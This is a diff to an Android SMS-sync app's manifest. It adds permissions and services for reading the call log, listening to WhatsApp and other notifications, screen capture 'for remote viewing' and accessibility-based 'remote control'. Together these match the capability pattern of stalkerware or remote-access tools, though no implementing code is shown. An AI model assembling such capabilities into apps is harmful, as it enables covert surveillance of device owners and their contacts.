@@ -21,6 +21,16 @@
     
     <!-- Phone state for MMS -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    
+    <!-- Call log permissions -->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    
+    <!-- Notification listener for WhatsApp and other apps -->
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+    
+    <!-- Screen capture and accessibility for remote control -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
     <application
         android:name=".SmsApplication"
@@ -140,6 +150,35 @@
             android:name=".service.SmsSyncService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
+
+        <!-- Notification Listener Service for WhatsApp and other apps -->
+        <service
+            android:name=".service.AppNotificationListenerService"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- Screen Capture Service for remote viewing -->
+        <service
+            android:name=".service.ScreenCaptureService"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
+        <!-- Accessibility Service for remote control -->
+        <service
+            android:name=".service.RemoteControlService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
 
     </application>
 
